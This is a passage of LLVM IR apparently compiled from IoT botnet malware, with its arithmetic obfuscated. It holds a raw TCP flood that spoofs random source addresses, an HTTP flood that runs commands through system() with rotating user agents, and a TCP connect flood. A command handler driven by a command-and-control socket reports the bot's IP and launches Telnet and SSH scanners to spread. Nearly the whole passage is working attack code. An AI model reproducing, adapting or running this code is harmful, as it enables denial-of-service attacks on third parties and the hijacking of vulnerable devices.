  %266 = or i16 %264, %265
  %267 = or i16 %262, 512
  store i16 %266, i16* %254, align 4
  br label %400

; <label>:268:                                    ; preds = %246
  %269 = load i8*, i8** %23, align 8
  %270 = call i32 @strcmp(i8* %269, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i32 0, i32 0)) #10
  %271 = icmp ne i32 %270, 0
  br i1 %271, label %298, label %272

; <label>:272:                                    ; preds = %268
  %273 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %274 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %273, i32 0, i32 0
  %275 = bitcast %union.anon.0* %274 to %struct.anon.1*
  %276 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %275, i32 0, i32 4
  %277 = load i16, i16* %276, align 4
  %278 = xor i16 -1025, -1
  %279 = xor i16 %277, %278
  %280 = and i16 %279, %277
  %281 = and i16 %277, -1025
  %282 = xor i16 %280, -1
  %283 = xor i16 1024, -1
  %284 = xor i16 5532, -1
  %285 = and i16 %282, 5532
  %286 = and i16 %280, %284
  %287 = and i16 %283, 5532
  %288 = and i16 1024, %284
  %289 = or i16 %285, %286
  %290 = or i16 %287, %288
  %291 = xor i16 %289, %290
  %292 = or i16 %282, %283
  %293 = xor i16 %292, -1
  %294 = or i16 5532, %284
  %295 = and i16 %293, %294
  %296 = or i16 %291, %295
  %297 = or i16 %280, 1024
  store i16 %296, i16* %276, align 4
  br label %399

; <label>:298:                                    ; preds = %268
  %299 = load i8*, i8** %23, align 8
  %300 = call i32 @strcmp(i8* %299, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.88, i32 0, i32 0)) #10
  %301 = icmp ne i32 %300, 0
  br i1 %301, label %328, label %302

; <label>:302:                                    ; preds = %298
  %303 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %304 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %303, i32 0, i32 0
  %305 = bitcast %union.anon.0* %304 to %struct.anon.1*
  %306 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %305, i32 0, i32 4
  %307 = load i16, i16* %306, align 4
  %308 = xor i16 -257, -1
  %309 = xor i16 %307, %308
  %310 = and i16 %309, %307
  %311 = and i16 %307, -257
  %312 = xor i16 %310, -1
  %313 = xor i16 256, -1
  %314 = xor i16 -27789, -1
  %315 = and i16 %312, -27789
  %316 = and i16 %310, %314
  %317 = and i16 %313, -27789
  %318 = and i16 256, %314
  %319 = or i16 %315, %316
  %320 = or i16 %317, %318
  %321 = xor i16 %319, %320
  %322 = or i16 %312, %313
  %323 = xor i16 %322, -1
  %324 = or i16 -27789, %314
  %325 = and i16 %323, %324
  %326 = or i16 %321, %325
  %327 = or i16 %310, 256
  store i16 %326, i16* %306, align 4
  br label %398

; <label>:328:                                    ; preds = %298
  %329 = load i8*, i8** %23, align 8
  %330 = call i32 @strcmp(i8* %329, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i32 0, i32 0)) #10
  %331 = icmp ne i32 %330, 0
  br i1 %331, label %358, label %332

; <label>:332:                                    ; preds = %328
  %333 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %334 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %333, i32 0, i32 0
  %335 = bitcast %union.anon.0* %334 to %struct.anon.1*
  %336 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %335, i32 0, i32 4
  %337 = load i16, i16* %336, align 4
  %338 = xor i16 -4097, -1
  %339 = xor i16 %337, %338
  %340 = and i16 %339, %337
  %341 = and i16 %337, -4097
  %342 = xor i16 %340, -1
  %343 = xor i16 4096, -1
  %344 = xor i16 32740, -1
  %345 = and i16 %342, 32740
  %346 = and i16 %340, %344
  %347 = and i16 %343, 32740
  %348 = and i16 4096, %344
  %349 = or i16 %345, %346
  %350 = or i16 %347, %348
  %351 = xor i16 %349, %350
  %352 = or i16 %342, %343
  %353 = xor i16 %352, -1
  %354 = or i16 32740, %344
  %355 = and i16 %353, %354
  %356 = or i16 %351, %355
  %357 = or i16 %340, 4096
  store i16 %356, i16* %336, align 4
  br label %397

; <label>:358:                                    ; preds = %328
  %359 = load i8*, i8** %23, align 8
  %360 = call i32 @strcmp(i8* %359, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.90, i32 0, i32 0)) #10
  %361 = icmp ne i32 %360, 0
  br i1 %361, label %392, label %362

; <label>:362:                                    ; preds = %358
  %363 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %364 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %363, i32 0, i32 0
  %365 = bitcast %union.anon.0* %364 to %struct.anon.1*
  %366 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %365, i32 0, i32 4
  %367 = load i16, i16* %366, align 4
  %368 = xor i16 %367, -1
  %369 = xor i16 -2049, -1
  %370 = xor i16 -11291, -1
  %371 = or i16 %368, %369
  %372 = or i16 -11291, %370
  %373 = xor i16 %371, -1
  %374 = and i16 %373, %372
  %375 = and i16 %367, -2049
  %376 = xor i16 %374, -1
  %377 = xor i16 2048, -1
  %378 = xor i16 -4541, -1
  %379 = and i16 %376, -4541
  %380 = and i16 %374, %378
  %381 = and i16 %377, -4541
  %382 = and i16 2048, %378
  %383 = or i16 %379, %380
  %384 = or i16 %381, %382
  %385 = xor i16 %383, %384
  %386 = or i16 %376, %377
  %387 = xor i16 %386, -1
  %388 = or i16 -4541, %378
  %389 = and i16 %387, %388
  %390 = or i16 %385, %389
  %391 = or i16 %374, 2048
  store i16 %390, i16* %366, align 4
  br label %396

; <label>:392:                                    ; preds = %358
  %393 = load i32, i32* @mainCommSock, align 4
  %394 = load i8*, i8** %23, align 8
  %395 = call i32 (i32, i8*, ...) @sockprintf(i32 %393, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.91, i32 0, i32 0), i8* %394)
  br label %396

; <label>:396:                                    ; preds = %392, %362
  br label %397

; <label>:397:                                    ; preds = %396, %332
  br label %398

; <label>:398:                                    ; preds = %397, %302
  br label %399

; <label>:399:                                    ; preds = %398, %272
  br label %400

; <label>:400:                                    ; preds = %399, %250
  %401 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %401, i8** %23, align 8
  br label %243

; <label>:402:                                    ; preds = %243
  br label %403

; <label>:403:                                    ; preds = %402, %154
  %404 = call i32 @rand_cmwc()
  %405 = trunc i32 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 0
  %408 = bitcast %union.anon.0* %407 to %struct.anon.1*
  %409 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %408, i32 0, i32 5
  store i16 %405, i16* %409, align 2
  %410 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 0
  %412 = bitcast %union.anon.0* %411 to %struct.anon.1*
  %413 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %412, i32 0, i32 6
  store i16 0, i16* %413, align 4
  %414 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i32 0, i32 0
  %416 = bitcast %union.anon.0* %415 to %struct.anon.1*
  %417 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %416, i32 0, i32 7
  store i16 0, i16* %417, align 2
  %418 = load i32, i32* %9, align 4
  %419 = icmp eq i32 %418, 0
  br i1 %419, label %420, label %422

; <label>:420:                                    ; preds = %403
  %421 = call i32 @rand_cmwc()
  br label %427

; <label>:422:                                    ; preds = %403
  %423 = load i32, i32* %9, align 4
  %424 = trunc i32 %423 to i16
  %425 = call zeroext i16 @htons(i16 zeroext %424) #13
  %426 = zext i16 %425 to i32
  br label %427

; <label>:427:                                    ; preds = %422, %420
  %428 = phi i32 [ %421, %420 ], [ %426, %422 ]
  %429 = trunc i32 %428 to i16
  %430 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %431 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %430, i32 0, i32 0
  %432 = bitcast %union.anon.0* %431 to %struct.anon.1*
  %433 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %432, i32 0, i32 1
  store i16 %429, i16* %433, align 2
  %434 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %435 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %436 = call zeroext i16 @tcpcsum(%struct.iphdr* %434, %struct.tcphdr* %435)
  %437 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %438 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %437, i32 0, i32 0
  %439 = bitcast %union.anon.0* %438 to %struct.anon.1*
  %440 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %439, i32 0, i32 6
  store i16 %436, i16* %440, align 4
  %441 = bitcast i8* %91 to i16*
  %442 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %443 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %442, i32 0, i32 2
  %444 = load i16, i16* %443, align 2
  %445 = zext i16 %444 to i32
  %446 = call zeroext i16 @csum(i16* %441, i32 %445)
  %447 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 7
  store i16 %446, i16* %448, align 2
  %449 = call i64 @time(i64* null) #2
  %450 = load i32, i32* %10, align 4
  %451 = sext i32 %450 to i64
  %452 = sub i64 %449, -7508223707613450350
  %453 = add i64 %452, %451
  %454 = add i64 %453, -7508223707613450350
  %455 = add nsw i64 %449, %451
  %456 = trunc i64 %454 to i32
  store i32 %456, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %457

; <label>:457:                                    ; preds = %511, %510, %427
  br label %458

; <label>:458:                                    ; preds = %457
  %459 = load i32, i32* %17, align 4
  %460 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %461 = call i64 @sendto(i32 %459, i8* %91, i64 %88, i32 0, %struct.sockaddr* %460, i32 16)
  %462 = load i32, i32* %19, align 4
  %463 = call i32 @getRandomIP(i32 %462)
  %464 = call i32 @htonl(i32 %463) #13
  %465 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %466 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %465, i32 0, i32 8
  store i32 %464, i32* %466, align 4
  %467 = call i32 @rand_cmwc()
  %468 = trunc i32 %467 to i16
  %469 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %470 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %469, i32 0, i32 3
  store i16 %468, i16* %470, align 4
  %471 = call i32 @rand_cmwc()
  %472 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %473 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %472, i32 0, i32 0
  %474 = bitcast %union.anon.0* %473 to %struct.anon.1*
  %475 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %474, i32 0, i32 2
  store i32 %471, i32* %475, align 4
  %476 = call i32 @rand_cmwc()
  %477 = trunc i32 %476 to i16
  %478 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %479 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %478, i32 0, i32 0
  %480 = bitcast %union.anon.0* %479 to %struct.anon.1*
  %481 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %480, i32 0, i32 0
  store i16 %477, i16* %481, align 4
  %482 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %483 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %482, i32 0, i32 0
  %484 = bitcast %union.anon.0* %483 to %struct.anon.1*
  %485 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %484, i32 0, i32 6
  store i16 0, i16* %485, align 4
  %486 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %487 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %488 = call zeroext i16 @tcpcsum(%struct.iphdr* %486, %struct.tcphdr* %487)
  %489 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %490 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %489, i32 0, i32 0
  %491 = bitcast %union.anon.0* %490 to %struct.anon.1*
  %492 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %491, i32 0, i32 6
  store i16 %488, i16* %492, align 4
  %493 = bitcast i8* %91 to i16*
  %494 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 2
  %496 = load i16, i16* %495, align 2
  %497 = zext i16 %496 to i32
  %498 = call zeroext i16 @csum(i16* %493, i32 %497)
  %499 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %500 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %499, i32 0, i32 7
  store i16 %498, i16* %500, align 2
  %501 = load i32, i32* %25, align 4
  %502 = load i32, i32* %15, align 4
  %503 = icmp eq i32 %501, %502
  br i1 %503, label %504, label %511

; <label>:504:                                    ; preds = %458
  %505 = call i64 @time(i64* null) #2
  %506 = load i32, i32* %24, align 4
  %507 = sext i32 %506 to i64
  %508 = icmp sgt i64 %505, %507
  br i1 %508, label %509, label %510

; <label>:509:                                    ; preds = %504
  br label %517

; <label>:510:                                    ; preds = %504
  store i32 0, i32* %25, align 4
  br label %457

; <label>:511:                                    ; preds = %458
  %512 = load i32, i32* %25, align 4
  %513 = add i32 %512, 680325045
  %514 = add i32 %513, 1
  %515 = sub i32 %514, 680325045
  %516 = add i32 %512, 1
  store i32 %515, i32* %25, align 4
  br label %457

; <label>:517:                                    ; preds = %509
  %518 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %518)
  br label %519

; <label>:519:                                    ; preds = %517, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [80 x i8*], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %9 = call i64 @time(i64* null) #2
  %10 = load i32, i32* %4, align 4
  %11 = sext i32 %10 to i64
  %12 = sub i64 0, %11
  %13 = sub i64 %9, %12
  %14 = add nsw i64 %9, %11
  %15 = trunc i64 %13 to i32
  store i32 %15, i32* %5, align 4
  %16 = call i32 @rand() #2
  %17 = sext i32 %16 to i64
  %18 = urem i64 %17, 23
  %19 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %18
  %20 = load i8*, i8** %19, align 8
  store i8* %20, i8** %7, align 8
  %21 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %22 = bitcast i8** %21 to i8*
  %23 = call i32 (i8*, i8*, ...) @sprintf(i8* %22, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i32 0, i32 0)) #2
  %24 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %25 = bitcast i8** %24 to i8*
  %26 = load i8*, i8** %7, align 8
  %27 = call i8* @strcat(i8* %25, i8* %26) #2
  %28 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %29 = bitcast i8** %28 to i8*
  %30 = call i8* @strcat(i8* %29, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0)) #2
  %31 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %32 = bitcast i8** %31 to i8*
  %33 = load i8*, i8** %3, align 8
  %34 = call i8* @strcat(i8* %32, i8* %33) #2
  br label %35

; <label>:35:                                     ; preds = %40, %2
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = call i64 @time(i64* null) #2
  %39 = icmp sgt i64 %37, %38
  br i1 %39, label %40, label %63

; <label>:40:                                     ; preds = %35
  %41 = call i32 @rand() #2
  %42 = sext i32 %41 to i64
  %43 = urem i64 %42, 23
  %44 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %7, align 8
  %46 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %47 = bitcast i8** %46 to i8*
  %48 = call i32 (i8*, i8*, ...) @sprintf(i8* %47, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i32 0, i32 0)) #2
  %49 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %50 = bitcast i8** %49 to i8*
  %51 = load i8*, i8** %7, align 8
  %52 = call i8* @strcat(i8* %50, i8* %51) #2
  %53 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %54 = bitcast i8** %53 to i8*
  %55 = call i8* @strcat(i8* %54, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0)) #2
  %56 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %57 = bitcast i8** %56 to i8*
  %58 = load i8*, i8** %3, align 8
  %59 = call i8* @strcat(i8* %57, i8* %58) #2
  %60 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %61 = bitcast i8** %60 to i8*
  %62 = call i32 @system(i8* %61)
  br label %35

; <label>:63:                                     ; preds = %35
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i64 @time(i64* null) #2
  %11 = load i32, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = sub i64 %10, 7743228650095818444
  %14 = add i64 %13, %12
  %15 = add i64 %14, 7743228650095818444
  %16 = add nsw i64 %10, %12
  %17 = trunc i64 %15 to i32
  store i32 %17, i32* %7, align 4
  %18 = load i8*, i8** %4, align 8
  %19 = call i32 @inet_addr(i8* %18) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  br label %27

; <label>:27:                                     ; preds = %32, %3
  %28 = load i32, i32* %7, align 4
  %29 = sext i32 %28 to i64
  %30 = call i64 @time(i64* null) #2
  %31 = icmp sgt i64 %29, %30
  br i1 %31, label %32, label %40

; <label>:32:                                     ; preds = %27
  %33 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %33, i32* %8, align 4
  %34 = load i32, i32* %8, align 4
  %35 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %36 = call i32 @connect(i32 %34, %struct.sockaddr* %35, i32 16)
  %37 = call i32 @sleep(i32 1)
  %38 = load i32, i32* %8, align 4
  %39 = call i32 @close(i32 %38)
  br label %27

; <label>:40:                                     ; preds = %27
  ret void
}

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i32 0, i32 0)) #10
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %46, label %43

; <label>:43:                                     ; preds = %2
  %44 = load i32, i32* @mainCommSock, align 4
  %45 = call i32 (i32, i8*, ...) @sockprintf(i32 %44, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0))
  br label %636

; <label>:46:                                     ; preds = %2
  %47 = load i8**, i8*** %4, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 0
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @strcmp(i8* %49, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.95, i32 0, i32 0)) #10
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %57, label %52

; <label>:52:                                     ; preds = %46
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %55 = call i8* @inet_ntoa(i32 %54) #2
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 %53, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.96, i32 0, i32 0), i8* %55)
  br label %636

; <label>:57:                                     ; preds = %46
  %58 = load i8**, i8*** %4, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 0
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 @strcmp(i8* %60, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.97, i32 0, i32 0)) #10
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %133, label %63

; <label>:63:                                     ; preds = %57
  %64 = load i32, i32* %3, align 4
  %65 = icmp ne i32 %64, 2
  br i1 %65, label %66, label %69

; <label>:66:                                     ; preds = %63
  %67 = load i32, i32* @mainCommSock, align 4
  %68 = call i32 (i32, i8*, ...) @sockprintf(i32 %67, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.98, i32 0, i32 0))
  br label %636

; <label>:69:                                     ; preds = %63
  %70 = load i8**, i8*** %4, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 1
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 @strcmp(i8* %72, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.99, i32 0, i32 0)) #10
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %132, label %75

; <label>:75:                                     ; preds = %69
  %76 = load i32, i32* @scanPid, align 4
  %77 = icmp eq i32 %76, 0
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %75
  br label %636

; <label>:79:                                     ; preds = %75
  %80 = load i32, i32* @mainCommSock, align 4
  %81 = call i32 (i32, i8*, ...) @sockprintf(i32 %80, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.100, i32 0, i32 0))
  %82 = load i32, i32* @scanPid, align 4
  %83 = call i32 @kill(i32 %82, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  %84 = load i8**, i8*** %4, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @strcmp(i8* %86, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.101, i32 0, i32 0)) #10
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %107, label %89

; <label>:89:                                     ; preds = %79
  %90 = load i32, i32* @scanPid, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %93

; <label>:92:                                     ; preds = %89
  br label %636

; <label>:93:                                     ; preds = %89
  %94 = call i32 @fork() #2
  store i32 %94, i32* %6, align 4
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i32 (i32, i8*, ...) @sockprintf(i32 %95, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.102, i32 0, i32 0))
  %97 = load i32, i32* %6, align 4
  %98 = icmp ugt i32 %97, 0
  br i1 %98, label %99, label %101

; <label>:99:                                     ; preds = %93
  %100 = load i32, i32* %6, align 4
  store i32 %100, i32* @scanPid, align 4
  br label %636

; <label>:101:                                    ; preds = %93
  %102 = load i32, i32* %6, align 4
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %101
  br label %636

; <label>:105:                                    ; preds = %101
  br label %106

; <label>:106:                                    ; preds = %105
  call void (i32, ...) bitcast (void ()* @TelnetScanner to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:107:                                    ; preds = %79
  %108 = load i8**, i8*** %4, align 8
  %109 = getelementptr inbounds i8*, i8** %108, i64 1
  %110 = load i8*, i8** %109, align 8
  %111 = call i32 @strcmp(i8* %110, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0)) #10
  %112 = icmp ne i32 %111, 0
  br i1 %112, label %131, label %113

; <label>:113:                                    ; preds = %107
  %114 = load i32, i32* @scanPid, align 4
  %115 = icmp ne i32 %114, 0
  br i1 %115, label %116, label %117

; <label>:116:                                    ; preds = %113
  br label %636

; <label>:117:                                    ; preds = %113
  %118 = call i32 @fork() #2
  store i32 %118, i32* %7, align 4
  %119 = load i32, i32* @mainCommSock, align 4
  %120 = call i32 (i32, i8*, ...) @sockprintf(i32 %119, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.104, i32 0, i32 0))
  %121 = load i32, i32* %7, align 4
  %122 = icmp ugt i32 %121, 0
  br i1 %122, label %123, label %125

; <label>:123:                                    ; preds = %117
  %124 = load i32, i32* %7, align 4
  store i32 %124, i32* @scanPid, align 4
  br label %636

; <label>:125:                                    ; preds = %117
  %126 = load i32, i32* %7, align 4
  %127 = icmp eq i32 %126, -1
  br i1 %127, label %128, label %129

; <label>:128:                                    ; preds = %125
  br label %636

; <label>:129:                                    ; preds = %125
  br label %130

; <label>:130:                                    ; preds = %129
  call void (i32, ...) bitcast (void ()* @SSHScanner to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:131:                                    ; preds = %107
  br label %132

; <label>:132:                                    ; preds = %131, %69
  br label %133

; <label>:133:                                    ; preds = %132, %57
  %134 = load i8**, i8*** %4, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 0
  %136 = load i8*, i8** %135, align 8
  %137 = call i32 @strcmp(i8* %136, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #10
  %138 = icmp ne i32 %137, 0
  br i1 %138, label %252, label %139

; <label>:139:                                    ; preds = %133
  %140 = load i32, i32* %3, align 4
  %141 = icmp slt i32 %140, 6
  br i1 %141, label %187, label %142

; <label>:142:                                    ; preds = %139
  %143 = load i8**, i8*** %4, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 3
  %145 = load i8*, i8** %144, align 8
  %146 = call i32 @atoi(i8* %145) #10
  %147 = icmp eq i32 %146, -1
  br i1 %147, label %187, label %148

; <label>:148:                                    ; preds = %142
  %149 = load i8**, i8*** %4, align 8
  %150 = getelementptr inbounds i8*, i8** %149, i64 2
  %151 = load i8*, i8** %150, align 8
  %152 = call i32 @atoi(i8* %151) #10
  %153 = icmp eq i32 %152, -1
  br i1 %153, label %187, label %154

; <label>:154:                                    ; preds = %148
  %155 = load i8**, i8*** %4, align 8
  %156 = getelementptr inbounds i8*, i8** %155, i64 4
  %157 = load i8*, i8** %156, align 8
  %158 = call i32 @atoi(i8* %157) #10
  %159 = icmp eq i32 %158, -1
  br i1 %159, label %187, label %160

; <label>:160:                                    ; preds = %154
  %161 = load i8**, i8*** %4, align 8
  %162 = getelementptr inbounds i8*, i8** %161, i64 5
  %163 = load i8*, i8** %162, align 8
  %164 = call i32 @atoi(i8* %163) #10
  %165 = icmp eq i32 %164, -1
  br i1 %165, label %187, label %166

; <label>:166:                                    ; preds = %160
  %167 = load i8**, i8*** %4, align 8
  %168 = getelementptr inbounds i8*, i8** %167, i64 5
  %169 = load i8*, i8** %168, align 8
  %170 = call i32 @atoi(i8* %169) #10
  %171 = icmp sgt i32 %170, 65500
  br i1 %171, label %187, label %172

; <label>:172:                                    ; preds = %166
  %173 = load i8**, i8*** %4, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 4
  %175 = load i8*, i8** %174, align 8
